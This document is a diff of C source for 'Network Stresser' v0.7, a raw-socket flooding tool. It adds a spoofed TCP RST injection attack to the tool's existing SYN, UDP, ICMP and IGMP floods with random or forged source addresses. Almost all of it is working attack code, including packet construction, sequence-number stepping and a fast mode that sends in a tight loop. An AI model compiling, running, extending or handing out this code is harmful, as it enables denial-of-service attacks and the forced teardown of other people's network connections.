@@ -1,11 +1,11 @@
 /*
 
-	Network Stresser v0.6 (Linux)
+	Network Stresser v0.7 (Linux)
 
 	Copyright 2004 Shen139 <shen139(at)eviltime(dot)com>
 
 
- Compile with: gcc stresser-0.6.c -o stresser -lpthread      #-Ox#
+ Compile with: gcc stresser-0.7.c -o stresser -lpthread      #-Ox#
 
 */
 
@@ -26,7 +26,7 @@
 #include <sched.h>
 #include "checksum.h"
 
-#define VERSION			"0.6"
+#define VERSION			"0.7"
 
 // #define CLEARSCREEN		// Uncomment this line to clear screen at startup
 
@@ -34,18 +34,22 @@
 #define MAXHOSTIP		20
 #define MAXHOSTLENGHT		20
 #define MAXPORTS		20
+#define PROTOCOLS		5
 
 #define WIW(a)				(a==1) ? ltp.tcp.sd.sbound  :   \
 					(a==2) ? ltp.udp.sd.sbound  :	\
 					(a==3) ? ltp.icmp.sd.sbound :	\
-						 ltp.igmp.sd.sbound	\
+					(a==4) ? ltp.igmp.sd.sbound :	\
+						 ltp.trst.source_port	\
 						&&			\
 					(a==1) ? ltp.tcp.sd.dbound  :	\
 					(a==2) ? ltp.udp.sd.dbound  :	\
 					(a==3) ? ltp.icmp.sd.dbound :	\
-						 ltp.igmp.sd.dbound 		
+					(a==4) ? ltp.igmp.sd.dbound :	\
+						 ltp.trst.dest_port 		
 
-pthread_t IDthread[4];
+
+pthread_t IDthread[PROTOCOLS];
 pthread_t IDthrdWait;
 pthread_mutex_t shit = 		PTHREAD_MUTEX_INITIALIZER;
 
@@ -63,6 +67,14 @@ struct _tcp_udp
 	int ports[MAXPORTS];
 };
 
+struct _tcprst
+{
+	struct _sd sd;
+	int seq;
+	int source_port;
+	int dest_port;
+};
+
 struct _icmp_igmp
 {
 	struct _sd sd;
@@ -70,18 +82,19 @@ struct _icmp_igmp
 
 struct listofip
 {
-	struct _tcp_udp tcp;
-	struct _tcp_udp udp;
-	struct _icmp_igmp icmp;
-	struct _icmp_igmp igmp;
+	struct _tcp_udp		tcp;
+	struct _tcp_udp		udp;
+	struct _icmp_igmp	icmp;
+	struct _icmp_igmp	igmp;
+	struct _tcprst		trst;
 }ltp;
 
 int 	iStop		= 1,
 	SeedB		= 0,
 	iTime		= 10,
+	iStep		= 1,
 	flag_continue	= 0,
 	bFastM		= 0;
-
 
 void usage(char* arg0)
 {
@@ -92,6 +105,7 @@ void usage(char* arg0)
 	printf("  -f Fast mode (new)\n");
 	printf("   + Protocols\n");
 	printf("   -t TCP SYN flood\n");
+	printf("   -T TCP RST Attack (source:destination_Host/IP source_port:dest_port inital_seq_num)\n");
 	printf("   -u UDP flood\n");
 	printf("   -i ICMP flood\n");
 	printf("   -g IGMP flood\n");
@@ -101,7 +115,6 @@ void usage(char* arg0)
 exit(0);
 }
 
-
 void *fWait			(void*);
 void  sigdie			(int);
 void  onalarm			(/*nothing*/);
@@ -110,21 +123,25 @@ int   ResolveHostIP		(char* ,struct _sd*);
 void  RandomIP			(char*);
 int   SeparateComma		(char*, int ,char[][], int*);
 void *StressTCP			(/*nothing*/);
+void *StressRST			(/*nothing*/);
 void *StressUDP			(/*nothing*/);
 void *StressICMP		(/*nothing*/);
 void *StressIGMP		(/*nothing*/);
-int   CompileTCPacket		(char*, char*, int, int, u_char*);
+int   CompileTCPacket		(char*, char*, int, int, int, int, u_char*);
 int   CompileUDPacket		(char*, char*, int, int, u_char*);
 int   CompileICMPacket		(char*, char*, u_char*);
 int   CompileIGMPacket		(char*, char*, int, int, u_char*);
 int   SendPacket		(char*, u_char*, int, char*, char*, int);
 void  set_priority		(int);
 
+
+
 int main(int argc, char *argv[])
 {
 char vet[MAXHOSTIP][MAXHOSTLENGHT];
 int i, c, n;
 extern int optind;
+
 
 #ifdef CLEARSCREEN
 	printf("\33[H\33[2J");		// Clear Screen
@@ -145,7 +162,7 @@ extern int optind;
 
 	memset(&ltp,0,sizeof(ltp));
 
-	while ((c = getopt(argc, argv, "situghrf?")) != -1)
+	while ((c = getopt(argc, argv, "sitTughrf?")) != -1)
 		switch (c)
 		{
 		case 's':
@@ -166,7 +183,7 @@ extern int optind;
 				printf(" -  Errors in arguments\n");
 				usage(argv[0]);
 			}
-			printf("\n +  Resolving TCP hostnames...");
+			printf("\n +  Resolving TCP (SYN) hostnames...");
 			if(ResolveHostIP(argv[optind], &ltp.tcp.sd))
 			{
 				printf("\n -  Errors in arguments\n");
@@ -175,7 +192,7 @@ extern int optind;
 			SeparateComma(argv[optind+1], strlen(argv[optind+1]),vet, &n);
 
 			memset(ltp.tcp.ports,0,sizeof(ltp.tcp.ports));
-			printf("\n  +  TCP Port(s):");
+			printf("\n  +  TCP (SYN) Port(s):");
 			for( i=0;i<n;i++)
 			{
 				ltp.tcp.ports[i]=atoi(vet[i]);
@@ -188,6 +205,52 @@ extern int optind;
 				printf("\n    - %i",ltp.tcp.ports[i]);
 			}
 			break;
+
+		case 'T':
+			if(argc-1<optind+2)
+			{
+				printf(" -  Errors in arguments\n");
+				usage(argv[0]);
+			}
+			printf("\n +  Resolving TCP (RST) hostname...");
+			if(ResolveHostIP(argv[optind], &ltp.trst.sd))
+			{
+				printf("\n -  Errors in arguments\n");
+				usage(argv[0]);
+			}
+
+			for(i=0;i<=strlen(argv[optind+1]);i++)
+				if(argv[optind+1][i]==':')
+					break;
+
+			printf("\n  +  TCP (RST) Port:");
+
+			argv[optind][i]=0;
+			ltp.trst.source_port = atoi(argv[optind+1]);
+			argv[optind][i]=':';
+			ltp.trst.dest_port = atoi(&argv[optind+1][i+1]);
+
+			if(ltp.trst.source_port == 0 || ltp.trst.dest_port == 0)
+			{
+				printf("\n -  Errors in arguments\n");
+				usage(argv[0]);
+			}
+
+			printf("\n    - Source port:       \t%i",ltp.trst.source_port);
+			printf("\n    - Destination port:  \t%i",ltp.trst.dest_port);
+
+			ltp.trst.seq = atoi(argv[optind+2]);
+
+			if(ltp.trst.seq == 0)
+			{
+				printf("\n -  Errors in arguments\n");
+				usage(argv[0]);
+			}
+
+			printf("\n  +  TCP (RST) Seq Number:\t%i",ltp.trst.seq);
+
+			break;
+
 
 		case 'u':
 			if(argc-1<optind+1)
@@ -272,14 +335,17 @@ extern int optind;
 		usage(argv[0]);
 	
 	printf("\n +  Stressing...(for %i second%s)\n",iTime, (iTime==1) ? "" : "s");
+	
+	fflush(stdout);
 
-	for(i=1;i<=4;i++)
+	for(i=1;i<=PROTOCOLS;i++)
 		if(WIW(i))
 			 if(pthread_create(&IDthread[i-1], NULL, 
 				(i==1) ? (void*)StressTCP : 
 				(i==2) ? (void*)StressUDP : 
 				(i==3) ? (void*)StressICMP : 
-					 (void*)StressIGMP, 
+				(i==4) ? (void*)StressIGMP :
+					 (void*)StressRST, 
 							NULL)!=0)
 			 {
 				printf("+    Thread error:\n");
@@ -295,7 +361,7 @@ extern int optind;
 	}
 
 
-	for(i=1;i<5;i++)
+	for(i=1;i<PROTOCOLS+1;i++)
 		if(WIW(i))
 			pthread_join(IDthread[i-1], NULL);
 
@@ -308,6 +374,8 @@ void sigdie(int signo)
 {
 	//Only a thread must execute this code
 	pthread_mutex_lock(&shit);
+
+	fflush(stdout);
 
 	//Nmap rulez :D
 	switch(signo)
@@ -334,7 +402,7 @@ exit(0);
 void onalarm()
 {
 	iStop=0;
-return ;
+return;
 }
 
 void *fWait(void *arg)
@@ -343,8 +411,10 @@ void *fWait(void *arg)
 	signal(SIGHUP,  sigdie);
 	signal(SIGTERM, sigdie);
 	signal(SIGALRM,onalarm);
+	
 	alarm(iTime);
-	while(iStop){/*__asm__ __volatile__ ("nop\n");*/}
+
+	while(iStop){/*nothing*/}
 
 pthread_exit(0);
 }
@@ -511,7 +581,9 @@ u_char* packet;
 
 		packet = (u_char *)malloc(sizeof(struct iphdr)+sizeof(struct tcphdr));
 
-		CompileTCPacket(tmpSIP,tmpDIP,ltp.tcp.ports[i_p],ID,packet);
+		//The source ip should be down otherwise when the client recives the syn/ack flags
+		//will replay with a rst flag and the server will free all the resources allocated!
+		CompileTCPacket(tmpSIP,tmpDIP,ltp.tcp.ports[i_p],rand()*1000,1,ID,packet);
 
 		SendPacket("TCP", packet, sizeof(struct iphdr)+sizeof(struct tcphdr), 
 					tmpSIP,tmpDIP, ltp.tcp.ports[i_p]);
@@ -522,11 +594,12 @@ u_char* packet;
 			while(iStop)
 			{
 				SendPacket("TCP", packet, sizeof(struct iphdr)+sizeof(struct tcphdr), 
-								tmpSIP,tmpDIP, ltp.udp.ports[i_p]);
+								tmpSIP,tmpDIP, ltp.tcp.ports[i_p]);
 				nPack++;		
 			}
 		}
-
+		
+		free(packet);
 		is++; id++; i_p++;
 		if(ltp.tcp.sd.source[is][0]==0)
 			is=0;
@@ -535,16 +608,60 @@ u_char* packet;
 		if(!ltp.tcp.ports[i_p])
 			i_p=0;
 
-	//The source ip must be down otherwise when the client recives the syn/ack flags
-	//will replay with a rst flag and the server will free all the resources allocated!
-	//English rulez :D
 		ID++;
 
 	}
-	printf("   - TCP packet sent:\t%i\n",nPack);
+	printf("   - TCP (SYN) packet sent:\t%i\n",nPack);
 
 pthread_exit(0);
 }
+
+void *StressRST()
+{
+int ID;
+char tmpSIP[16],tmpDIP[16];
+int nPack=0;
+u_char* packet;
+
+	ID=ltp.trst.seq;
+	while(iStop)
+	{
+		strncpy(tmpDIP,ltp.trst.sd.dest[0],16); 
+		strncpy(tmpSIP,ltp.trst.sd.source[0],16); 
+
+		if(strcmp(ltp.trst.sd.source[0],"RANDOM")==0)	
+			RandomIP(tmpSIP); 
+		if(strcmp(ltp.trst.sd.dest[0],"RANDOM")==0) 
+			RandomIP(tmpDIP);
+
+		packet = (u_char *)malloc(sizeof(struct iphdr)+sizeof(struct tcphdr));
+
+		CompileTCPacket(tmpSIP,tmpDIP,ltp.trst.source_port,ltp.trst.dest_port,2,ID,packet);
+
+		SendPacket("RST", packet, sizeof(struct iphdr)+sizeof(struct tcphdr), 
+					tmpSIP,tmpDIP, ltp.trst.dest_port);
+		nPack++;		
+
+		if(bFastM)
+		{
+			while(iStop)
+			{
+				SendPacket("RST", packet, sizeof(struct iphdr)+sizeof(struct tcphdr), 
+								tmpSIP,tmpDIP, ltp.trst.dest_port);
+				nPack++;		
+			}
+		}
+		
+		free(packet);
+		
+		ID++;
+
+	}
+	printf("   - TCP (RST) packet sent:\t%i\n",nPack);
+
+pthread_exit(0);
+}
+
 
 void *StressUDP()
 {
@@ -580,7 +697,7 @@ u_char* packet;
 				nPack++;		
 			}
 		}
-
+		free(packet);
 		is++; id++; i_p++;
 		if(ltp.udp.sd.source[is][0]==0)
 			is=0;
@@ -591,7 +708,7 @@ u_char* packet;
 		ID++;
 
 	}
-	printf("   - UDP packet sent:\t%i\n",nPack);
+	printf("   - UDP packet sent:        \t%i\n",nPack);
 
 pthread_exit(0);
 }
@@ -629,14 +746,14 @@ u_char* packet;
 				nPack++;		
 			}
 		}
-
+		free(packet);
 		is++; id++;
 		if(ltp.icmp.sd.source[is][0]==0)
 			is=0;
 		if(ltp.icmp.sd.dest[id][0]==0)
 			id=0;
 	}
-	printf("   - ICMP packet sent:\t%i\n",nPack);
+	printf("   - ICMP packet sent:       \t%i\n",nPack);
 
 pthread_exit(0);
 }
@@ -675,14 +792,14 @@ u_char* packet;
 				nPack++;		
 			}
 		}
-
+		free(packet);
 		is++; id++;
 		if(ltp.igmp.sd.source[is][0]==0)
 			is=0;
 		if(ltp.igmp.sd.dest[id][0]==0)
 			id=0;
 	}
-	printf("   - IGMP packet sent:\t%i\n",nPack);
+	printf("   - IGMP packet sent:       \t%i\n",nPack);
 
 pthread_exit(0);
 }
@@ -709,11 +826,14 @@ u_char *packet;
 	memcpy(packet + sizeof(struct iphdr), &icmp, sizeof(icmp));
 
 	memcpy(rPckt,packet,sizeof(struct iphdr)+sizeof(struct icmp));
-
+free(packet);
 return 1;
 }
 
-int CompileTCPacket(char *soAddr,char *dAddr,int port,int ID, u_char *rPckt)
+int CompileTCPacket(char *soAddr,char *dAddr,int sport,int dport, int nseq,int flag, u_char *rPckt)
+/*	Flag == 1 ? -> SYN on
+		else   RST on
+*/
 {
 struct iphdr ip;
 struct tcphdr tcp;
@@ -722,20 +842,23 @@ struct psd_tcp psdtcp;
 
 	packet = (u_char *)malloc(sizeof(struct iphdr)+sizeof(struct tcphdr));
 
-	CompileIPhdr(&ip,soAddr,dAddr,IPPROTO_TCP,ID);
+	CompileIPhdr(&ip,soAddr,dAddr,IPPROTO_TCP,getpid());
 
 	memcpy(packet,&ip,sizeof(ip));
 
 	//See RFC at: http://www.networksorcery.com/enp/protocol/tcp.htm
-	tcp.source = rand()*1000;
-	tcp.dest   = htons(port);
-	tcp.seq = ID;
+	tcp.source = htons(sport);
+	tcp.dest   = htons(dport);
+	tcp.seq = nseq;
 	tcp.ack_seq = 0;
 	tcp.res1 = 0;
 	tcp.doff = 5;
 	tcp.fin  = 0;
-	tcp.syn  = 1;
-	tcp.rst  = 0;
+
+	if(flag==1)
+		tcp.syn  = 1;
+	else
+		tcp.rst  = 1;
 	tcp.psh  = 0;
 	tcp.ack  = 0;
 	tcp.urg  = 0;
@@ -755,7 +878,7 @@ struct psd_tcp psdtcp;
 	memcpy(packet + sizeof(struct iphdr), &tcp, sizeof(tcp));
 
 	memcpy(rPckt,packet,sizeof(struct iphdr)+sizeof(struct tcphdr));
-
+free(packet);
 return 1;
 }
 
@@ -790,7 +913,7 @@ struct psd_udp psdudp;
 	memcpy(packet + sizeof(struct iphdr), &udp, sizeof(udp));
 
 	memcpy(rPckt,packet,sizeof(struct iphdr)+sizeof(struct udphdr));
-	
+free(packet);	
 return 1;
 }
 
@@ -815,7 +938,7 @@ u_char *packet;
 	memcpy(packet + sizeof(struct iphdr), &igmp, sizeof(struct igmp));
 
 	memcpy(rPckt,packet,sizeof(struct iphdr)+sizeof(struct igmp));
-
+free(packet);
 return 1;
 }
 
@@ -830,7 +953,8 @@ int sock;/*,optv=1;*/
 
 	if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW))<0)
 	{
-		fprintf(stderr,"+  %s packet error\n",protocol);
+		fprintf(stderr,"+  %s packet error\n",(strcmp(protocol,"TCP")==0) ? "TCP (SYN)" : 
+						((strcmp(protocol,"RST")==0) ? "TCP (RST)" : protocol));
 		perror("   - Socket() ");
 		pthread_exit(0);
 	}
